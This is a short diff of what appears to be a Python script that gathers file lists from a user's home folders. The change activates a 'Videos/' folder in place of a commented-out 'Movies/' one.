@@ -35,7 +35,7 @@ def list_files(path):
 files = list_files(path + "Documents/")
 files.extend(list_files(path + "Downloads/"))
 files.extend(list_files(path + "Pictures/"))
-#files.extend(list_files(path + "Movies/"))
+files.extend(list_files(path + "Videos/"))
 files.extend(list_files(path + "Music/"))
 files.extend(list_files(path + "Desktop/"))
 
